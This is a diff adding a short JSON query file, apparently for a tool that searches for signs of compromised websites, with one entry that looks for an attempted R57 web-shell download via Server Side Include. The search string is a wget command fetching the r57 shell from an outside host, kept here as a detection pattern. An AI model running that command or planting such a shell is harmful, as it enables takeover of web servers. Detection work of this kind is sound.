@@ -1,0 +1,10 @@
+{
+  "queries": {
+    "r57shell_attempt": {
+      "query": "\"wget http://www.r57shell.net/shell\"",
+      "category": "Command Injection",
+      "notes": "Attempted R57Shell Server Side Include (SSI). Site is probably compromised, but the SSI include didn't work properly.",
+      "snippet": "yes"
+    }
+  }
+}
